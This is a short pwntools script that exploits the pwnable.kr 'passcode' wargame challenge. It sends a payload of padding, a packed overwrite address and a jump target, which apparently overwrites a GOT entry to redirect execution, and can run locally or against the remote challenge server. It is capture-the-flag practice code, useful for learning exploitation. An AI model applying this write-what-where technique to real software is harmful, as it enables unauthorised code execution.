from pwn import *
import sys
context.update(arch="i386", os="linux")
context.log_level = 'debug' # output verbose log

HOST = "passcode@pwnable.kr"
PORT = 2222
conn = None

payload = ''
if len(sys.argv) > 1 and sys.argv[1] == "r":
    conn = remote(HOST,PORT)
else:
    conn = process('./passcode')

payload = b"A" * 96
payload += p32(0x804a004)
payload += str.encode(str(0x080485d7))

log.info(str(conn.recvline()))
print("payload:",payload)
conn.sendline(payload)
log.success(str(conn.recvall()))